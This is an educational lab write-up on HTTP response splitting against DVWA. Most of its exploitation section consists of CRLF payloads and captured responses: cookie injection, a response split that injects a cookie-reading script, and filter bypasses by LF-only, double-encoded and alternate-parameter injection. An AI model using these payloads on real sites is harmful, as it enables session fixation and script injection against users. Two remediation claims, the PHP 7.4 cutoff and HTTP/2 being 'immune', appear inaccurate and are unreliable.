# Lab Write-Up: HTTP Response Splitting & Header Injection
**Date:** 2026-09-23  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Injection  
**OWASP Top 10:** A03:2021 – Injection  

---

## 1. Introduction

HTTP Response Splitting (also called CRLF Injection) is a web vulnerability that occurs when user-supplied input is embedded into HTTP response headers without proper sanitization. By injecting Carriage Return (`\r` / `%0d`) and Line Feed (`\n` / `%0a`) characters, an attacker can manipulate the HTTP response — injecting arbitrary headers, splitting responses, and even enabling XSS or cache poisoning attacks.

**Goal of this lab:** Inject CRLF characters into DVWA's HTTP response headers to demonstrate header injection, cookie injection, and response splitting.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA (various modules with redirect/header output) |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Burp Suite, Browser                  |
| **Network**      | Local lab (NAT/Host-Only)            |

---

## 3. Vulnerability Overview

### What is HTTP Response Splitting?

HTTP headers are separated by CRLF sequences (`\r\n`). When user input is injected into a `Location:` or other header without stripping newlines, an attacker can inject extra headers or even a second response body.

**Vulnerable Code (PHP):**
```php
$redirect = $_GET['url'];
header("Location: " . $redirect);
```

**Normal request:**
```
GET /redirect.php?url=https://trusted.com
```

**Normal response:**
```
HTTP/1.1 302 Found
Location: https://trusted.com
```

**Injected request (CRLF):**
```
GET /redirect.php?url=https://trusted.com%0d%0aSet-Cookie:%20hacked=1
```

**Injected response:**
```
HTTP/1.1 302 Found
Location: https://trusted.com
Set-Cookie: hacked=1
```

The attacker injected an extra `Set-Cookie` header!

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Use DVWA's redirect functionality or any page that reflects user input into response headers. Set security to **Low**.

#### Step 1 – Identify the Header Injection Point

The DVWA Open Redirect module or any `Location:` redirect is a good test point. Use Burp to intercept.

**Test endpoint:**
```
http://localhost/dvwa/vulnerabilities/redirect/index.php?redirect=test
```

#### Step 2 – Basic CRLF Test

**Payload (URL-encoded):**
```
?redirect=http://google.com%0d%0aInjected-Header:%20test
```

**Decoded:**
```
http://google.com
Injected-Header: test
```

**Intercepted response in Burp:**
```
HTTP/1.1 302 Found
Location: http://google.com
Injected-Header: test
```

✅ CRLF injection confirmed.

#### Step 3 – Cookie Injection

**Payload:**
```
?redirect=http://google.com%0d%0aSet-Cookie:%20admin=1;%20Path=/
```

**Response headers:**
```
HTTP/1.1 302 Found
Location: http://google.com
Set-Cookie: admin=1; Path=/
```

**Result:** The victim's browser sets `admin=1` cookie — potential privilege escalation if the app trusts this.

#### Step 4 – XSS via Response Splitting

**Payload to split the response and inject a 200 OK with XSS body:**
```
?redirect=%0d%0a%0d%0a<html><script>alert(document.cookie)</script></html>
```

**Response:**
```
HTTP/1.1 302 Found
Location: 
[blank line — end of headers]
<html><script>alert(document.cookie)</script></html>
```

Some older browsers and caches treat the second part as a new response body — leading to XSS.

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** Standard `\r\n` and `%0d%0a` may be filtered.

#### Step 1 – Try Alternate Encodings

```
%0a         (LF only — many servers accept this)
%0d%0a      (CRLF — standard)
%0D%0A      (uppercase — same bytes, case-insensitive URL decode)
%u000d%u000a (Unicode encoding)
```

**Payload with LF only:**
```
?redirect=http://google.com%0aSet-Cookie:%20hacked=medium
```

**Result:** If the server uses `\n` as a header separator (common in some frameworks), injection still works ✅

#### Step 2 – Double-Encoded CRLF

If the server decodes once but the backend decodes twice:
```
?redirect=http://google.com%250d%250a   (% → %25, so %0d → %250d)
```

After first decode: `%0d%0a`
After second decode: `\r\n`

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** Strict filtering of CRLF characters in headers.

#### Step 1 – Header Injection via Other Parameters

Look for other parameters or input fields reflected in response headers — the main redirect may be fixed but another parameter might not be:

```
?redirect=info.php&lang=%0d%0aSet-Cookie:%20hacked=high
```

#### Step 2 – Response Header Reflection Test

Use Burp to systematically test each request parameter for CRLF reflection. Any parameter that appears in response headers (Content-Language, X-Custom-Header, etc.) is a potential injection point.

#### Step 3 – HTTP/2 Downgrade Attack

Some HTTP/2 servers vulnerable to request smuggling may still process CRLF injections during HTTP/1.1 downgrade. This is advanced — use Burp's HTTP Request Smuggler extension to test.

---

## 5. Impact Scenarios

| Attack                    | Mechanism                                   | Impact              |
|---------------------------|---------------------------------------------|---------------------|
| Session Hijacking         | Inject `Set-Cookie` with attacker's session | Account takeover    |
| Cache Poisoning           | Inject fake response in proxy cache         | Mass XSS            |
| XSS via Split Response    | Inject full HTML response body              | JavaScript execution|
| Security Header Bypass    | Override `X-Frame-Options`, `CSP`           | Clickjacking, XSS   |
| Open Redirect + Phishing  | Combine with redirect injection             | Credential theft     |

---

## 6. Findings Summary

| Security Level | Vulnerable | Method                      | Outcome               |
|----------------|------------|-----------------------------|-----------------------|
| Low            | ✅ Yes     | Direct `%0d%0a` injection   | Cookie/header injected|
| Medium         | ✅ Yes     | `%0a` only / double-encode  | Partial bypass        |
| High           | ⚠️ Partial | Other param / smuggling     | Context-dependent     |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | High     |
| **CVSS Score** | 7.2      |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: Low |

**Business Impact:**
- Cookie/session injection enabling account takeover
- Cache poisoning affecting all users of a shared proxy
- XSS delivery via split response
- Bypass of security headers (CSP, X-Frame-Options)

---

## 8. Remediation Recommendations

| Fix                            | Description                                                       |
|--------------------------------|-------------------------------------------------------------------|
| **Strip CRLF Characters**      | Remove `\r`, `\n`, `%0d`, `%0a` from all header inputs          |
| **Use `header()` Safely**      | PHP's `header()` blocks CRLF since PHP 7.4 — keep PHP updated   |
| **Input Validation**           | Whitelist valid URL formats, reject anything with newlines       |
| **Use Framework Abstractions** | Use `redirect()` helpers that handle encoding                    |
| **HTTP/2 by Default**          | HTTP/2 is binary and immune to CRLF injection                   |

**Secure Code (PHP):**
```php
// Vulnerable
header("Location: " . $_GET['url']);

// Secure – strip CRLF and validate
$url = str_replace(["\r", "\n"], '', $_GET['url']);
if (filter_var($url, FILTER_VALIDATE_URL)) {
    header("Location: " . $url);
} else {
    die('Invalid redirect URL');
}
```

---

## 9. References

- [OWASP HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)
- [PortSwigger – HTTP Header Injection](https://portswigger.net/kb/issues/00200200_http-response-header-injection)
- [PayloadAllTheThings – CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA Redirect / Header-reflecting endpoint
Payload:   ?redirect=http://trusted.com%0d%0aSet-Cookie:%20admin=1
Result:    Injected Set-Cookie header delivered to victim's browser
Further:   Full response split enabling XSS via double-CRLF body injection
Severity:  HIGH (CVSS 7.2)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
